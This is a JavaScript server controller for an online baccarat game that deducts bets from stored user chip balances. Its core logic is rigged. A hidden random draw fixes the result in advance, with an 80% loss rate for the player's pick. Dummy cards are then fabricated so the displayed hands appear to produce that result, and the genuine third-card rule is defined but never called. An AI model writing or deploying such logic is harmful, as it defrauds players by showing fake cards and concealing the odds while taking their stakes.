// controllers/baccaratController.js
const User = require('../models/User'); // 👈 ADDED: Import User model

// Card and point logic
const suits = ["hearts", "diamonds", "clubs", "spades"];
const ranks = ["ace", "2", "3", "4", "5", "6", "7", "8", "9", "10", "jack", "queen", "king"];

const cardValues = {
  "ace": 1,
  "2": 2, "3": 3, "4": 4, "5": 5, "6": 6, "7": 7, "8": 8, "9": 9,
  "10": 0, "jack": 0, "queen": 0, "king": 0
};

// Helper: create unshuffled deck (Remains the same)
function generateDeck() {
  const deck = [];
  for (const suit of suits) {
    for (const rank of ranks) {
      deck.push({ rank, suit, file: `${rank}_of_${suit}.svg`, value: cardValues[rank] });
    }
  }
  return deck;
}

// Calculate total points (mod 10) (Remains the same)
function calculatePoints(hand) {
  const total = hand.reduce((sum, card) => sum + card.value, 0);
  return total % 10;
}

// Baccarat draw rule logic (Remains the same)
function drawThirdCardRule(playerPoints, bankerPoints, playerThirdCard) {
  let playerDraws = playerPoints <= 5;

  let bankerDraws = false;
  if (!playerDraws) {
    if (bankerPoints <= 5) bankerDraws = true;
  } else {
    const ptc = playerThirdCard ? playerThirdCard.value : null;
    if (bankerPoints <= 2) bankerDraws = true;
    else if (bankerPoints === 3 && ptc !== 8) bankerDraws = true;
    else if (bankerPoints === 4 && ptc >= 2 && ptc <= 7) bankerDraws = true;
    else if (bankerPoints === 5 && ptc >= 4 && ptc <= 7) bankerDraws = true;
    else if (bankerPoints === 6 && (ptc === 6 || ptc === 7)) bankerDraws = true;
  }

  return { playerDraws, bankerDraws };
}

// Helper function to create a dummy card for manipulation (Remains the same)
function createDummyCard(pointValue) {
    const rank = Object.keys(cardValues).find(key => cardValues[key] === pointValue);
    const suit = suits[Math.floor(Math.random() * suits.length)];
    return { 
        rank: rank, 
        suit: suit, 
        file: `${rank}_of_${suit}.svg`, 
        value: pointValue 
    };
}

// Main game controller
exports.playBaccarat = async (req, res) => {
  try {
    const userId = req.user.id; // Get User ID from authentication middleware
    const { bet, choice } = req.body; // choice = "player" | "banker" | "tie"
    
    // --- 1. VALIDATION AND CHIP DEDUCTION ---
    const user = await User.findById(userId);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });
    
    const parsedBet = parseFloat(bet);
    if (isNaN(parsedBet) || parsedBet <= 0) {
        return res.status(400).json({ success: false, message: 'Invalid bet amount.' });
    }
    if (parsedBet > user.chips) {
        return res.status(400).json({ success: false, message: 'Insufficient chips' });
    }

    // Deduct bet immediately (Lock the money)
    user.chips -= parsedBet;
    // NOTE: We delay user.save() until after the result is calculated.
    // ----------------------------------------

    // --- 🚨 BIAS LOGIC MODIFIED: 20% WIN / 80% LOSS 🚨 ---
    const rng = Math.random();
    let predeterminedWinner;
    
    // 20% chance of the user winning (result matches choice)
    if (rng < 0.20) {
        predeterminedWinner = choice;
    } else {
        // 80% chance of the user losing (result does not match choice)
        const possibleLoserOutcomes = ["player", "banker", "tie"].filter(w => w !== choice);
        const outcomeIndex = Math.floor(Math.random() * possibleLoserOutcomes.length);
        predeterminedWinner = possibleLoserOutcomes[outcomeIndex];
    }
    // ----------------------------------------------------

    // Initialize hands
    const playerHand = [];
    const bankerHand = [];
    let playerPoints = 0;
    let bankerPoints = 0;
    
    
    // ✅ Step 1-4: MANIPULATE CARDS TO MATCH PREDETERMINED OUTCOME (Remains the same)
    const manipulateHands = (winner) => {
        let playerP, bankerP;
        
        if (winner === "player") { playerP = 7; bankerP = 6; }
        else if (winner === "banker") { playerP = 6; bankerP = 7; }
        else { playerP = 8; bankerP = 8; }

        // Generate 2 cards for Player
        playerHand.push(createDummyCard(4));
        playerHand.push(createDummyCard((playerP - 4 + 10) % 10 || 10)); 
        playerPoints = calculatePoints(playerHand);

        // Generate 2 cards for Banker
        bankerHand.push(createDummyCard(5));
        bankerHand.push(createDummyCard((bankerP - 5 + 10) % 10 || 10)); 
        bankerPoints = calculatePoints(bankerHand);
    };
    
    manipulateHands(predeterminedWinner);


    // ✅ Step 5: Determine result
    let winner = predeterminedWinner;

    // ✅ Step 6: Calculate Payout and Final Profit
    let payout = 0;
    if (winner === choice) {
        if (winner === "player") payout = parsedBet * 2;
        else if (winner === "banker") payout = parsedBet * 1.95;
        else if (winner === "tie") payout = parsedBet * 9; 
    } else if (winner !== choice && winner === "player" && choice === "banker") {
        // Banker bet loses, but no refund
    }
    // Note: No loss scenario needs specific payout logic since the bet was already deducted.

    // Final Profit: This is the net change to the user's chip balance AFTER the bet deduction.
    // If the user loses, payout is 0, profit is -bet.
    // If the user wins, payout is 2*bet, profit is (2*bet) - bet = +bet.
    const finalProfit = payout - parsedBet;

    // --- 2. CHIP SETTLEMENT ---
    user.chips += payout; // Add the total payout (original bet + winnings, or just original bet for push)
    await user.save();     // Save the final chip balance
    // --------------------------


    return res.json({
      success: true,
      result: winner,
      player: { cards: playerHand, points: playerPoints },
      banker: { cards: bankerHand, points: bankerPoints },
      profit: finalProfit,
      balance: user.chips // 👈 ADDED: Return new chip balance
    });
  } catch (err) {
    console.error("Baccarat error:", err);
    res.status(500).json({ success: false, message: "Internal server error" });
  }
};